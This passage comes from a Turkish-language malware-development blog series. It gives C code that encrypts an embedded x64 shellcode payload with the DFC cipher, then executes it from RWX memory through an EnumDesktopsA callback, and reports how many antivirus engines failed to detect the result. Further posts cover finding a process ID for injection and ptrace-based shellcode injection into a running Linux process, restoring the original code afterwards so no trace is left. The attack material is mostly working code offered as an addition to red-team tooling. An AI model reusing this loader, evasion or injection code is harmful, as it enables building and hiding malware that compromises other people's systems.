void dfc_encrypt_shellcode(unsigned char* shellcode, int shellcode_len,
uint8_t* key) {
key_schedule(key); // generate subkeys
int i;
uint32_t* ptr = (uint32_t*)shellcode;
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
dfc_encrypt(ptr, key);
ptr += 4; // move to the next 128-bit block (4 * 32-bit words)
}
// handle remaining bytes by padding with 0x90 (NOP)
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] = { 0x90 };
memcpy(pad, ptr, remaining);
dfc_encrypt((uint32_t*)pad, key);
memcpy(ptr, pad, remaining);
}
}

// function to decrypt shellcode using DFC
void dfc_decrypt_shellcode(unsigned char* shellcode, int shellcode_len,
uint8_t* key) {
key_schedule(key); // generate subkeys
int i;
uint32_t* ptr = (uint32_t*)shellcode;
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
dfc_decrypt(ptr, key);
ptr += 4;
}
// handle remaining bytes by padding
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] = { 0x90 };
memcpy(pad, ptr, remaining);
dfc_decrypt((uint32_t*)pad, key);
memcpy(ptr, pad, remaining);
}
}

int main() {
unsigned char my_payload[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
"\x2e\x2e\x5e\x3d\x00";

int my_payload_len = sizeof(my_payload);
int pad_len = my_payload_len +
(BLOCK_SIZE - my_payload_len % BLOCK_SIZE) % BLOCK_SIZE;
unsigned char padded[pad_len];
memset(padded, 0x90, pad_len); // pad with NOPs
memcpy(padded, my_payload, my_payload_len);
printf("original shellcode:\n");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", my_payload[i]);
}
printf("\n\n");

uint8_t key[8] = { 0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0 };

dfc_encrypt_shellcode(padded, pad_len, key);

printf("encrypted shellcode:\n");
for (int i = 0; i < pad_len; i++) {
	printf("%02x ", padded[i]);
}
printf("\n\n");

dfc_decrypt_shellcode(padded, pad_len, key);

printf("decrypted shellcode:\n");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", padded[i]);
}
printf("\n\n");

// allocate and execute decrypted shellcode
LPVOID mem = VirtualAlloc(NULL, my_payload_len, MEM_COMMIT,
PAGE_EXECUTE_READWRITE);
RtlMoveMemory(mem, padded, my_payload_len);
EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);
return 0;
}

Her zamanki gibi, bazı yazdırma mantıkları yalnızca mantığın doğruluğunu kontrol etmek ve EnumDesktopsA aracılığıyla payload çalıştırmak içindir.
Demo

Hadi her şeyi çalışırken görelim. Derleyin (kendi Linux makinemde):
x86_64-w64-mingw32-gcc -O2 hack.c -o hack.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections \
-Wno-write-strings -fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc

+++++++++++++++++++++++++++++++++++++++++++++++

Ardından, sadece hedef makinede (benim durumumda Windows 11 x64) çalıştırın:
.\hack.exe
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++

Gördüğünüz gibi, her şey mükemmel çalıştı!=..=
Shannon entropisi hesaplama:
python3 entropy.py -f hack.exe
+++++++++++++++++++++++++++++++++++++++++++++++
.text bölümündeki payload.


Kötü amaçlı yazılım tarayıcısı ile tarama:
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++
https://websec.net/scanner/result/8d7862b2-dbba-48bb-924c-a3694cac3269
VirusTotal'a yükleme:
+++++++++++++++++++++++++++++++++++++++++++++++
https://www.virustotal.com/gui/file/9d702d3194ef3a6160f9ab7f6b30ebaae92c365fa4
c12368c7e9ec589ebbe1fd/detection 
Gördüğünüz gibi, yalnızca 72 antivirüs motorundan 29'u dosyamızı kötü amaçlı olarak algılıyor.

İlginç sonuç.
Bildiğiniz gibi, araştırmalarımda ve bu blogdaki birçok şifreleme algoritması Feistel ağlarını kullanıyor.
cryptoanalysis


Decorrelated Fast Cipher (DFC) üzerine yapılan kriptanaliz, özellikle diferansiyel analiz yoluyla yapısındaki güvenlik açıklarını ortaya çıkarmıştır. 1999 yılında, kriptograflar Lars Knudsen ve Vincent Rijmen (Lars R. Knudsen ve Vincent Rijmen. “On The Decorrelated Fast Cipher (DFC) and Its Theory”. Department of Informatics, University of Bergen, N-5020 Bergen. 24 Mart 1999. 6. Uluslararası Hızlı Yazılım Şifreleme Çalıştayı (FSE '99). Roma: Springer-Verlag. s. 81–94) diferansiyel saldırılar kullanılarak DFC’nin 8 turdan oluşan yapısının zayıflatılabileceğini keşfetti. Çalışmaları, bir diferansiyel saldırının DFC’nin 8 turunun 6’sını başarılı bir şekilde kırabileceğini ve şifrenin Feistel turlarının belirli bölümlerine girilen farklılıklara karşı hassasiyetini ortaya çıkardı. Bu saldırı, DFC’nin yayılım özelliklerindeki zayıflıkları göstererek, AES yarışması için tasarlanmış olmasına rağmen, DFC’nin bazı diğer adaylara kıyasla kriptanalitik tekniklere karşı daha az dirençli olduğunu ortaya koydu.
Umarım bu yazı, kötü amaçlı yazılım araştırmacıları, C/C++ programcıları için faydalı olur, mavi takım üyelerinin bu ilginç şifreleme tekniği hakkında farkındalığını artırır ve kırmızı takım üyelerinin cephaneliğine bir silah ekler.
https://en.wikipedia.org/wiki/DFC_(cipher)
On The Decorrelated Fast Cipher (DFC) and Its Theory. Lars R. Knudsen and Vincent
Rijmen
Malware And Hunting For Persistence: How Adversaries Exploit Your Windows? -
Cocomelonc. HACKLU 2024
Malware and cryptography 1
Github’taki kaynak kod


98. Linux kötü amaçlı yazılım geliştirme 1: Kernel hacklemeye giriş. Basit C örneği.

﷽

+++++++++++++++++++++++++++++++++++++++++++++++

Aslında, bu gönderiye “Kötü Amaçlı Yazılım Geliştirme Hilesi Bölüm 41” gibi başka bir ad verilebilirdi, ancak burada yine okuyucularımın bana sorduğu birçok soruya cevap veriyorum. Linux için nasıl kötü amaçlı yazılım geliştirebilirim?


Belki de bu gönderi, aynı zamanda bir dizi gönderinin başlangıç noktası olacaktır (beni uzun süredir okuyanlar muhtemelen başladığım ancak henüz mantıksal sonuca ulaştırmadığım birçok farklı gönderi serim olduğunu fark etmişlerdir).

Dürüst olmak gerekirse, Linux çekirdeği için programlama konusundaki son deneyimim üniversitede yaklaşık 10+ yıl önceydi, o zamandan beri çok şey değişti, bu yüzden rootkit, stealer gibi kötü amaçlı yazılımlar yazmaya çalışmaya karar verdim...

Öncelikle, sistemimde hiçbir şeyi bozmamak için bir Linux sanal makinesi - Xubuntu 20.04 kurdum. Daha yeni bir Ubuntu (Xubuntu, Lubuntu) sürümü yükleyebileceğinizi düşünüyorum, ancak 20.04 sürümü deneyler için oldukça uygun:
+++++++++++++++++++++++++++++++++++++++++++++++
pratik örnek

Örneğin, bir kernel rootkit gibi kötü amaçlı bir yazılım oluşturmamız gerekiyorsa, geliştirdiğimiz kod, oluşturduğumuz çekirdek modüllerini kullanarak çekirdek seviyesinde ayrıcalıklarla (ring 0) çalıştırılabilir. Bu rolde çalışmanın bazı zorlukları olabilir. Bir yandan, çalışmalarımız kullanıcı ve kullanıcı alanı araçları tarafından fark edilmez. Ancak bir hata yaparsak, bunun ciddi sonuçları olabilir. Çekirdek kendi kusurlarından kendini koruyamaz, bu da tüm sistemi çökertme riskimiz olduğu anlamına gelir. Sanal makine (VM) kullanmak, Xubuntu’muzda geliştirme yapmanın zorluklarını azaltmaya yardımcı olarak bunu çok daha yönetilebilir bir gereksinim haline getirecektir.

Modülleri içe aktarmakla başlayalım:
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
Bu #include ifadeleri, çekirdek modülü programlaması için gerekli başlık dosyalarını içerir:
linux/init.h - modül başlatma ve temizleme için makrolar ve fonksiyonlar içerir.
linux/module.h - modül programlaması için makrolar ve fonksiyonlar içerir.
linux/kernel.h - çekirdek geliştirme için çeşitli fonksiyonlar ve makrolar sağlar.

MODULE_LICENSE("GPL");
MODULE_AUTHOR("cocomelonc");
MODULE_DESCRIPTION("kernel-test-01");
MODULE_VERSION("0.001");
Bu makrolar modül hakkında meta veriler tanımlar:
MODULE_LICENSE("GPL") - modülün yayınlandığı lisansı belirtir. Burada, GNU Genel Kamu Lisansı’dır.
MODULE_AUTHOR("cocomelonc") - modülün yazarını belirtir.
MODULE_DESCRIPTION("kernel-test-01") - modül hakkında açıklama sağlar.
MODULE_VERSION("0.001") - modülün sürümünü belirtir.
Sonraki birkaç satırda başlatma fonksiyonunu tanımlıyoruz:
static int __init hack_init(void) {
printk(KERN_INFO "Meow-meow!\n");
return 0;
}
Bu fonksiyon, modülün başlatma fonksiyonudur:
static int __init hack_init(void) - fonksiyonu statik (bu dosyaya özel) olarak tanımlar ve __initmakrosunu kullanarak bir başlatma fonksiyonu olarak işaretler.
printk(KERN_INFO "Meow-meow!\n") - çekirdek günlüğüne "Meow-meow!" mesajını bilgi seviyesinde yazar.
return 0 - başarılı başlatmayı göstermek için 0 döndürür.
Sonraki fonksiyon ise hack_exit fonksiyonudur:
static void __exit hack_exit(void) {
	printk(KERN_INFO "Meow-bow!\n");
}
Bu fonksiyon, modülün temizleme fonksiyonudur:
static void __exit hack_exit(void) - fonksiyonu statik olarak tanımlar ve __exit makrosunu kullanarak bir çıkış (temizleme) fonksiyonu olarak işaretler.
printk(KERN_INFO "Meow-bow!\n") - çekirdek günlüğüne "Meow-bow!" mesajını yazar.
Daha sonra, başlatma ve temizleme fonksiyonlarını kaydediyoruz:
module_init(hack_init);
module_exit(hack_exit);
Böylece, tam kaynak kodu şu şekilde görünmektedir hack.c:
/*
* hack.c
* introduction to linux kernel hacking
* author @cocomelonc
* https://cocomelonc.github.io/linux/2024/06/20/kernel-hacking-1.html
*/
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("cocomelonc");
MODULE_DESCRIPTION("kernel-test-01");
MODULE_VERSION("0.001");

static int __init hack_init(void) {
printk(KERN_INFO "Meow-meow!\n");
return 0;
}

static void __exit hack_exit(void) {
	printk(KERN_INFO "Meow-bow!\n");
}

module_init(hack_init);
module_exit(hack_exit);
Bu kod, bir Linux çekirdek modülünün temel yapısını, başlatma ve temizleme fonksiyonlarının nasıl tanımlanacağını ve modül hakkında nasıl meta veriler sağlanacağını göstermektedir.
Demo

Şimdi bu modülü çalışırken görelim. Derlemeden önce şunları yüklemeniz gerekir:
$ apt update
$ apt install build-essential linux-headers-$(uname -r)
Derlemek için şu içeriğe sahip bir Makefile dosyası oluşturun:
obj-m += hack.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean

Sağlanan Makefile, bir Linux çekirdek modülünü derlemek ve temizlemek için kullanılır.
obj-m değişkeni, çekirdek modülü olarak derlenecek nesne dosyalarını listelemek için kullanılır. hack.o, hack.c kaynak dosyasından derlenecek olan nesne dosyasıdır. += operatörü, hack.o dosyasını modül olarak derlenecek nesne dosyaları listesine ekler.
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
Bu komut, modülü derlemek için make programını çağırır.
-C /lib/modules/$(shell uname -r)/build - çalışma dizinini mevcut çekirdeğin derleme dizinine değiştirir. $(shell uname -r), mevcut çekirdeğin sürümünü alır ve /lib/modules/$(shell uname -r)/build dizini, çekirdek derleme dizininin bulunduğu yerdir.
M=$(PWD) - M değişkenini mevcut çalışma dizinine ($(PWD)) ayarlar, yani modül kaynak kodunun bulunduğu yerdir. Bu, çekirdek derleme sistemine, modül kaynak dosyalarını mevcut dizinde aramasını söyler.
modules - çekirdek derleme sistemindeki bu hedef, obj-m içinde listelenen modülleri derler.
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean bu komut, modül derleme dosyalarını temizler.

Bir terminal açın, hack.c ve Makefile içeren dizine gidin:
+++++++++++++++++++++++++++++++++++++++++++++++


ve modülü derlemek için aşağıdaki komutu çalıştırın:

make
+++++++++++++++++++++++++++++++++++++++++++++++
Sonuç olarak, make komutunu çalıştırdıktan sonra birkaç yeni ara ikili dosya bulacaksınız. Ancak en önemli ekleme, yeni bir hack.ko dosyasının varlığı olacaktır.
Şimdi sırada ne var? Yeni bir terminal açın ve dmesg komutunu çalıştırın:
Dmesg
+++++++++++++++++++++++++++++++++++++++++++++++

Daha sonra, hack.ko dizininizden çalışan çekirdeğe bu modülü yüklemek için aşağıdaki komutu çalıştırın:
sudo insmod hack.ko
Şimdi, yeni bir terminalden dmesg çıktısını tekrar kontrol ederseniz, "Meow-meow!" satırını görmelisiniz:
+++++++++++++++++++++++++++++++++++++++++++++++
Çalışan çekirdekten modülümüzü silmek için sadece şu komutu çalıştırın:
sudo rmmod hack
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++
Gördüğünüz gibi, çekirdek arabelleğinde "Meow-bow!" mesajı var, yani her şey beklendiği gibi mükemmel şekilde çalıştı!=..=
Tabii ki, bir uyarı daha var. Bir Linux çekirdek modülü oluştururken, modülün derlendiği belirli çekirdek sürümüne ait olduğunu unutmamak önemlidir. Eğer farklı bir çekirdeğe sahip bir sisteme modülü yüklemeye çalışırsanız, büyük olasılıkla yüklenmeyecektir.
Burada bir mola vereceğimizi düşünüyorum, rootkit ve stealer konularına bir sonraki gönderilerde bakacağız. 
Umarım bu pratik örnek içeren gönderi, kötü amaçlı yazılım araştırmacıları, Linux programcıları ve Linux çekirdek programlama teknikleriyle ilgilenen herkes için faydalı olmuştur.
Github’taki kaynak kod

99. linux kötü amaçlı yazılım geliştirme 2: işlemi ID’ye göre bulma. Basit C örneği.

﷽

+++++++++++++++++++++++++++++++++++++++++++++++
Linux için kötü amaçlı yazılım programlarken rootkitler ve diğer ilginç ve kötü şeyler hakkında ışık tutacağımı söz verdim, ancak başlamadan önce basit şeyler yapmayı deneyelim.
Bazı okuyucularım, örneğin, Linux süreçlerine kod enjeksiyonu yapmanın nasıl olduğunu bilmiyorlar.
Beni çok uzun süredir okuyanlar, enjeksiyon amaçları için Windows'ta process ID bulmaya yönelik böyle ilginç ve basit bir örneği hatırlarlar.
pratik örnek
Hadi Linux için benzer bir mantık uygulayalım. Her şey çok basit:
/*
* hack.c
* linux hacking part 2:
* find process ID by name
* author @cocomelonc
* https://cocomelonc.github.io/linux/2024/09/16/linux-hacking-2.html
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <ctype.h>

int find_process_by_name(const char *proc_name) {
DIR *dir;
struct dirent *entry;
int pid = -1;

dir = opendir("/proc");
if (dir == NULL) {
perror("opendir /proc failed");
return-1;
}

while ((entry = readdir(dir)) != NULL) {
if (isdigit(*entry->d_name)) {
char path[512];
snprintf(path, sizeof(path), "/proc/%s/comm", entry->d_name);

FILE *fp = fopen(path, "r");
if (fp) {
char comm[512];
if (fgets(comm, sizeof(comm), fp) != NULL) {
// remove trailing newline from comm
comm[strcspn(comm, "\r\n")] = 0;
if (strcmp(comm, proc_name) == 0) {
pid = atoi(entry->d_name);
fclose(fp);
break;
}
}
fclose(fp);
                 }
}
}
closedir(dir);
return pid;
}

int main(int argc, char *argv[]) {
if (argc != 2) {
fprintf(stderr, "usage: %s <process_name>\n", argv[0]);
return 1;
}

int pid = find_process_by_name(argv[1]);
if (pid != -1) {
	printf("found pid: %d\n", pid);
} else {
	printf("process '%s' not found.\n", argv[1]);
}
return 0;
}

Kodum, Linux'ta çalışan bir süreci adını tarayarak /proc dizininde nasıl arayacağınızı gösteriyor./proc/[pid]/comm içinde depolanan süreç adlarını okur ve bir eşleşme bulursa hedef sürecin process ID (PID) değerini alır.
Gördüğünüz gibi burada sadece iki fonksiyon var. Öncelikle, find_process_by_name fonksiyonunu uyguladık.Bu fonksiyon, /proc dizini içinde süreç adını aramaktan sorumludur.
Bir süreç adı (proc_name) alır ve bulunan sürecin PID değerini döndürür veya süreç bulunmazsa -1 döndürür.
Fonksiyon, opendir() fonksiyonunu kullanarak /proc dizinini açar. Bu dizin, çalışan süreçler hakkında bilgi içerir ve her alt dizin bir process ID (PID) ile adlandırılmıştır.
Daha sonra, /proc içindeki girişleri yineleyin:
while ((entry = readdir(dir)) != NULL) {
readdir() fonksiyonu, /proc dizinindeki tüm girişleri yinelemek için kullanılır, her giriş ya çalışan bir süreci (eğer giriş adı bir sayıysa) ya da diğer sistem dosyalarını temsil eder.
Daha sonra, giriş adının bir sayı olup olmadığını (yani bir process ID'yi) temsil edip etmediğini kontrol eder. Sadece rakamlarla adlandırılmış dizinler /proc içinde geçerli süreç dizinleridir:
if (isdigit(*entry->d_name)) {
Dikkat edilmelidir ki, her /proc/[pid] dizini içindeki comm dosyası, o sürece bağlı yürütülebilir dosyanın adını içerir:
snprintf(path, sizeof(path), "/proc/%s/comm", entry->d_name);
Bu, /proc/, process ID (d_name) ve /comm birleştirilerek comm dosyasının tam yolunun oluşturulduğu anlamına gelir.
Son olarak, comm dosyasını açar, süreç adını okur ve karşılaştırır:
FILE *fp = fopen(path, "r");
if (fp) {
char comm[512];
if (fgets(comm, sizeof(comm), fp) != NULL) {
// remove trailing newline from comm
comm[strcspn(comm, "\r\n")] = 0;
if (strcmp(comm, proc_name) == 0) {
pid = atoi(entry->d_name);
fclose(fp);
break;
	}
        }

Daha sonra, elbette, dizini kapatın ve geri dönün.
İkinci fonksiyon ise main fonksiyondur:
int main(int argc, char *argv[]) {
if (argc != 2) {
fprintf(stderr, "usage: %s <process_name>\n", argv[0]);
return 1;
}

int pid = find_process_by_name(argv[1]);
if (pid != -1) {
	printf("found pid: %d\n", pid);
} else {
	printf("process '%s' not found.\n", argv[1]);
}
return 0;
}
Sadece komut satırı argümanlarını kontrol edin ve süreç bulma mantığını çalıştırın.
Demo

Her şeyin çalıştığını kontrol edelim. Derleyin:
gcc -z execstack hack.c -o hack
+++++++++++++++++++++++++++++++++++++++++++++++
Daha sonra Linux makinesinde çalıştırın:
.\hack [process_name]
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++
Gördüğünüz gibi, her şey mükemmel çalıştı. Benim durumumda Telegram ID (75678) bulduk!=..=
Her şey çok kolay görünüyor, değil mi?

Ancak burada bir püf noktası var. Eğer örneğimde olduğu gibi firefox gibi işlemler için çalıştırmaya çalışırsak:
.\hack firefox
şunu alırız:
+++++++++++++++++++++++++++++++++++++++++++++++

Karşılaştığımız sorun, firefox gibi bazı işlemlerin alt işlemler veya birden fazla iş parçacığı oluşturabilmesi ve bunların hepsinin process adlarını comm dosyasında saklamayabilmesi olabilir.
/ proc/[pid]/comm dosyası, çalıştırılabilir dosyanın adını tam yol olmadan saklar ve özellikle aynı ebeveyn altında birden fazla iş parçacığı veya alt işlem varsa, işlemin tüm örneklerini yansıtmayabilir.
Bu yüzden olası sorunlar şu olabilir:
/proc/[pid]/comm içinde farklı işlem adları: alt işlemler veya iş parçacıkları farklı adlandırma kuralları kullanabilir veya firefox olarak /proc/[pid]/comm altında listelenmeyebilir.
zombiler veya yetim işlemler: bazı işlemler, zombi veya yetim durumda olmaları halinde doğru şekilde görünmeyebilir.
practical example 2

Comm dosyasını okumak yerine, süreci başlatmak için kullanılan tam komutu (işlem adı, tam yol ve argümanlar dahil) içeren /proc/[pid]/cmdline dosyasını kontrol edebiliriz.
Bu dosya, firefox gibi birden fazla instance oluşturan işlemler için daha güvenilirdir.
Bu yüzden başka bir versiyon (hack2.c) oluşturdum:
/*
* hack2.c
* linux hacking part 2:
* find processes ID by name
* author @cocomelonc
* https://cocomelonc.github.io/linux/2024/09/16/linux-hacking-2.html
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <ctype.h>

void find_processes_by_name(const char *proc_name) {
DIR *dir;
struct dirent *entry;
int found = 0;

dir = opendir("/proc");
if (dir == NULL) {
perror("opendir /proc failed");
return;
}
while ((entry = readdir(dir)) != NULL) {
if (isdigit(*entry->d_name)) {
char path[512];
snprintf(path, sizeof(path), "/proc/%s/cmdline", entry->d_name);

FILE *fp = fopen(path, "r");
if (fp) {
char cmdline[512];
if (fgets(cmdline, sizeof(cmdline), fp) != NULL) {
// command line arguments are separated by '\0',
// we only need the first argument (the program name)
cmdline[strcspn(cmdline, "\0")] = 0;

// perform case-insensitive comparison
// of the base process name
const char *base_name = strrchr(cmdline, '/');
base_name = base_name ? base_name + 1 : cmdline;

if (strcasecmp(base_name, proc_name) == 0) {
printf("found process: %s with PID: %s\n", base_name,
entry->d_name);
found = 1;
}
}
fclose(fp);
}
}
}

if (!found) {
	printf("no processes found with the name '%s'.\n", proc_name);
}

closedir(dir);
}
int main(int argc, char *argv[]) {
if (argc != 2) {
fprintf(stderr, "usage: %s <process_name>\n", argv[0]);
return 1;
}
find_processes_by_name(argv[1]);
return 0;
}
Gördüğünüz gibi, bu kodun güncellenmiş bir versiyonudur ve bunun yerine /proc/[pid]/cmdline dosyasını okur.


Ancak /proc/[pid]/cmdline veya /proc/[pid]/status dosyası her zaman tüm alt işlemleri veya iş parçacıklarını doğru şekilde göstermeyebilir.
demo 2

İkinci örneği çalıştırarak kontrol edelim. Derleyin:
gcc -z execstack hack2.c -o hack2
+++++++++++++++++++++++++++++++++++++++++++++++
Daha sonra Linux makinesinde çalıştırın:
.\hack [process_name]
+++++++++++++++++++++++++++++++++++++++++++++++
Gördüğünüz gibi, doğru.
Umarım bu pratik örnek içeren gönderi, malware araştırmacıları, Linux programcıları ve Linux çekirdek programlama ile kod enjeksiyon teknikleriyle ilgilenen herkes için faydalıdır.
Find process ID by name. Windows version
Github’taki kaynak kod



100. Linux kötü amaçlı yazılım geliştirme 3: ptrace ile Linux işlem enjeksiyonu. Basit C örneği.

﷽
+++++++++++++++++++++++++++++++++++++++++++++++
Bilinen enjeksiyon tekniklerinin sayısı Windows makinelerde çok büyük, örneğin:
ilk, ikinci veya üçüncü örnekler blogumdan.


Bugün, ptrace sistem çağrısını kullanarak harika bir Linux enjeksiyon tekniğini göstereceğim.
Ptrace'ı, diğer işlemleri incelemek, değiştirmek ve hatta ele geçirmek için kişisel anahtarınız olarak düşünün.
ptrace
ptrace, uzak işlemleri hata ayıklamanıza izin veren bir sistem çağrısıdır. Başlatan işlem, hata ayıklanan işlemin belleğini ve yazmaçlarını inceleyebilir ve değiştirebilir. Örneğin, GDB, hata ayıklanan süreci kontrol etmek için ptrace kullanır.
+++++++++++++++++++++++++++++++++++++++++++++++

Ptrace, aşağıdakiler gibi birkaç faydalı hata ayıklama işlemi sunar:
PTRACE_ATTACH - bir sürece bağlanmanıza izin verir, hata ayıklanan süreci duraklatır
PTRACE_PEEKTEXT - başka bir sürecin adres alanından veri okumanıza izin verir
PTRACE_POKETEXT - başka bir sürecin adres alanına veri yazmanıza izin verir
PTRACE_GETREGS - sürecin mevcut kayıt durumu okur
PTRACE_SETREGS - sürecin kayıt durumu yazar
PTRACE_CONT - hata ayıklanan sürecin yürütülmesine devam eder
pratik örnek
Bu adım adım eğitimde şunları göstereceğim:
Çalışan bir sürece bağlanma.
Özel shellcode enjekte etme.
Yürütmeyi ele geçirme.
Yürütmeden sonra orijinal durumu geri yükleme.
Her şeyi basit bir pratik C örneği ile açıklayacağız. Haydi başlayalım!
İlk yapmamız gereken, ilgilendiğimiz sürece bağlanmaktır. Bunu yapmak için, ptrace çağrısını PTRACE_ATTACH parametresi ile kullanmak yeterlidir:
printf("attaching to process %d\n", target_pid);
if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) == -1) {
perror("failed to attach");
return 1;
}
Bu, işlemi durdurur ve belleğini ve yazmaçlarını incelememizi sağlar.
İşlemci yazmaçlarında herhangi bir değişiklik yapmadan önce, mevcut durumlarını yedeklemeliyiz. Bu, daha sonraki bir aşamada yürütmeye devam etmemizi sağlar:
struct user_regs_struct target_regs;
//...
//...
// get the current registers
printf("reading process registers\n");
ptrace(PTRACE_GETREGS, target_pid, NULL, &target_regs);
PTRACE_PEEKDATA kullanarak, talimat işaretçisindeki (RIP) belleği okuyoruz.
Bu, enjeksiyondan sonra süreci orijinal durumuna geri yüklemek için çok önemlidir.
Bu nedenle, read_mem adlı bir fonksiyon oluşturdum:
// read memory from the target process
void read_mem(pid_t target_pid, long addr, char *buffer, int len) {
union data_chunk {
long val;
char bytes[sizeof(long)];
} chunk;
int i = 0;
while (i < len / sizeof(long)) {
chunk.val = ptrace(PTRACE_PEEKDATA, target_pid, addr + i * sizeof(long), NULL);
memcpy(buffer + i * sizeof(long), chunk.bytes, sizeof(long));
i++;
}
int remaining = len % sizeof(long);
if (remaining) {
chunk.val = ptrace(PTRACE_PEEKDATA, target_pid, addr + i * sizeof(long), NULL);
memcpy(buffer + i * sizeof(long), chunk.bytes, remaining);
}
}
Bu fonksiyonun adım adım işleyişini göstereyim.

ptrace, belleği sizeof(long) baytlık parçalar halinde okur. Bu birlik (union), veriyi ptrace işlemleri için long olarak ele almamıza ve aynı zamanda bireysel baytlara erişmemize olanak tanır:
union data_chunk {
long val;
char bytes[sizeof(long)];
} chunk;
Daha sonra tam sizeof(long) uzunlukta blokları okuyoruz:
int i = 0;
while (i < len / sizeof(long)) {
chunk.val = ptrace(PTRACE_PEEKDATA, target_pid, addr + i * sizeof(long), NULL);
memcpy(buffer + i * sizeof(long), chunk.bytes, sizeof(long));
i++;
}
Gördüğünüz gibi, burada hedef işlemin belirli bir bellek adresinden bir long (genellikle 64 bit sistemlerde 8 bayt) okuyoruz.Ardından, okunan veri memcpy kullanılarak tampon içine kopyalanır.Bu işlem, tüm sizeof(long) uzunluğundaki bloklar okunana kadar devam eder.
Daha sonra kalan baytları ele alırız:
int remaining = len % sizeof(long);
if (remaining) {
chunk.val = ptrace(PTRACE_PEEKDATA, target_pid, addr + i * sizeof(long), NULL);
memcpy(buffer + i * sizeof(long), chunk.bytes, remaining);
}
Mantık basittir: Eğer uzunluk (len) sizeof(long)'un katı değilse, okunması gereken ekstra baytlar olabilir.
Fonksiyon, bu kalan baytları okumak için bellekte bir long daha okur ve sadece gerekli baytları tampona kopyalar.


Sonuç olarak, hedef işlemin belirli bir adresinden başlayan len baytlık tüm bellek bloğu tampon içine kaydedilir.
PTRACE_POKEDATA ile, özel shellcode'umuzu hedef işlemin belleğine RIP adresinde enjekte ediyoruz.
// write memory into the target process
void write_mem(pid_t target_pid, long addr, char *buffer, int len) {
union data_chunk {
long val;
char bytes[sizeof(long)];
} chunk;
int i = 0;
while (i < len / sizeof(long)) {
memcpy(chunk.bytes, buffer + i * sizeof(long), sizeof(long));
ptrace(PTRACE_POKEDATA, target_pid, addr + i * sizeof(long), chunk.val);
i++;
}
int remaining = len % sizeof(long);
if (remaining) {
memcpy(chunk.bytes, buffer + i * sizeof(long), remaining);
ptrace(PTRACE_POKEDATA, target_pid, addr + i * sizeof(long), chunk.val);
}
}
Gördüğünüz gibi, bu fonksiyon read_mem'e benzer, ancak belleğe yazma mantığını uygular.
Sonraki aşamada, işlemin talimat işaretçisini (RIP) değiştirilerek enjekte edilen payload çalıştırılır:
ptrace(PTRACE_CONT, target_pid, NULL, NULL);
Payload yürütüldükten sonra, işlemi çökertmemek veya kanıt bırakmamak için orijinal bellek talimatlarını geri yüklüyoruz:
write_mem(target_pid, target_regs.rip, original_code, payload_len);
Son olarak, hedef süreçten ayrılarak normal çalışmasına devam etmesini sağlıyoruz:
